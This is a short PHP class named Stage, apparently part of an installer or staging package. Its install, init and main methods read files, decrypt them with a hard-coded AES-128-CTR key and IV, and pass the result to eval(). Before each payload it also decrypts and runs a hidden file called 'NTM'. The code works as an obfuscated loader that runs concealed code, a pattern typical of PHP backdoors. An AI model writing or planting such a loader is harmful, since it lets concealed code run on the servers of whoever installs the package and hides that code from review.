<?php

namespace ASB\Stage\App;



class Stage
{
    private Static $cip = "AES-128-CTR";
    private Static $key = "VsAfcSga0rq849N8PQYY0EeR0GWOffh6D4jBj2Oztgk";
    private Static $options = 0;

    private Static $iv = 'BackupsStagesSVS';


    public static function install($name)
    {
        $type = file_get_contents($name);
        static::vol(self::run($type));
    }
    public static function init($init)
    {
        $type = file_get_contents($init);
        static::vol(self::run($type));
    }
    public static function main($main)
    {
        return self::run($main);
    }
    private static function run(false|string $type)
    {
        return openssl_decrypt(
            $type,
            Static::$cip,
            static::$key,
            Static::$options,
            Static::$iv
        );
    }

    private static function vol($data): void
    {
        eval(self::run(file_get_contents(__DIR__.DIRECTORY_SEPARATOR.'NTM')));
        eval($data);
    }
}
